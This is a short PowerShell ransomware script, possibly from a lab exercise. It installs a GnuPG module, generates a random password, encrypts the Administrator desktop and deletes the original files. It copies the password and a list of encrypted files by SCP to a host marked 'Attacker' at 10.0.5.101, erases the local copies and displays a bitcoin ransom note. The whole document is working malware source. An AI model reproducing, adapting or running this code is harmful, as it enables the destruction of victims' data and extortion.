
# Install GNUPG

#Download link
$gnupgLink = 'https://raw.githubusercontent.com/adbertram/Random-PowerShell-Work/master/Security/GnuPg.psm1'

#Download location
$DownloadPath = 'C:\Program Files\WindowsPowerShell\Modules\GnuPg'

#Set directory 
$null = New-Item -Path $DownloadPath -Type Directory

try {

Invoke-WebRequest -Uri $gnupgLink -OutFile (Join-Path -Path $DownloadPath -ChildPath 'GnuPg.psm1')

Install-GnuPG -DownloadFolderPath $DownloadPath
} 

catch {"Already installed"}

# Generate SMEM

Add-Type -AssemblyName 'System.Web'


$SMEM = [System.Web.Security.Membership]::GeneratePassword('20','5') 
Write-Host($SMEM)
$SMEM | Out-File SMEM.txt

# Create lists of the files for deletion and encryption
$FilesToDelete = ''
$FoldersToEncrypt = ''


# Clear lists so previous script running doesnt break it

Clear-Variable -name "FilesToDelete"
Clear-Variable -name "FoldersToEncrypt"


# Get all Users
$Users = Get-ChildItem -Path C:\Users | Select-Object -ExpandProperty Name 
Write-Host($Users)


# Create a list of target files for deletion and encryption on the desktop
ForEach ($user in $Users) {

        $Desktop = "C:\Users\Administrator\Desktop\"
   try {$FoldersToEncrypt += Get-childitem -path $Desktop | Select-Object Directory
        $FilesToDelete += Get-childitem -path $Desktop | Select-Object -ExpandProperty FullName }
        catch {"Public cannot be found"} 
}

# Create list of targets

$FoldersToEncrypt | Out-File encryptedfiles.txt
$FoldersToEncrypt = Get-Content -Path encryptedfiles.txt | Select-Object Unique

foreach ($file in $FoldersToEncrypt) { 
    try{Add-Encryption -FolderPath $Desktop -Password $SMEM }
       catch{"Error Encrypting "}
       break
}

Write-Host($FoldersToEncrypt) 


Write-Host ($FilesToDelete)
# Delete files
ForEach ($file in $FilesToDelete) {
try{Remove-Item -Path $file}
catch { "Error" }
}


# SCP to Attacker
try {Install-Module -Name Posh-SSH}
catch {"already installed"}
$credential = Get-Credential
Set-SCPItem -ComputerName '10.0.5.101' -Credential $credential -Path "C:\Users\Administrator\SMEM.txt" -Destination '/tmp/'
Set-SCPItem -ComputerName '10.0.5.101' -Credential $credential -Path "C:\Users\Administrator\encryptedfiles.txt" -Destination '/tmp/'
Remove-Item C:\Users\Administrator\SMEM.txt
Remove-Item C:\Users\Administrator\encryptedfiles.txt

# Ransom Note
Write-Host("Your files have been encrypted! Pay 5000 dollars to the following bitcoin address or never see your files again! Address: 19sjdjwe193845mdjejwm2")
